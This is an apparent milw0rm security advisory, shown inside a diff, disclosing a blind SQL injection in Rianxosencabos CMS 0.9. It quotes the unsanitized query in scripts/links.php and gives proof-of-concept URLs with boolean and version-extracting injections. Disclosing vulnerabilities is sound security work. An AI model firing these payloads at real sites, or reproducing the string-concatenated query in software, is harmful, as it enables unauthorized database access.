@@ -1,0 +1,36 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Rianxosencabos CMS 0.9 Remote Blind SQL Injection Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+/ Script: Rianxosencabos
+/ Version: 0.9
+/ File affected: scripts/links.php
+/ Download: http://downloads.sourceforge.net/rsccms/rsccms.tar.gz
+
+
+ka0x <ka0x01 [at] gmail [dot] com>
+D.O.M Labs - Security Researchers
+- www.domlabs.org
+
+Vuln code:
+
+-----
+88:  function visita($id) {
+93:  $resultado=$bd->consulta("SELECT direccion, clicks FROM links WHERE id=$id LIMIT 1");
+....
+
+112: if ($_GET['id']) {
+113: links::visita($_GET['id'])
+-----
+
+
+Proof of Concept:
+
+http://[host]/[cms]/?s=links&id=1 and 1=1 -> True
+http://[host]/[cms]/?s=links&id=1 and 1=0 -> False
+http://[host]/[cms]/?s=links&id=1 and ascii(substring(@@version,1,1)=52
+
+
+__END__
+
+# milw0rm.com [2008-09-30]
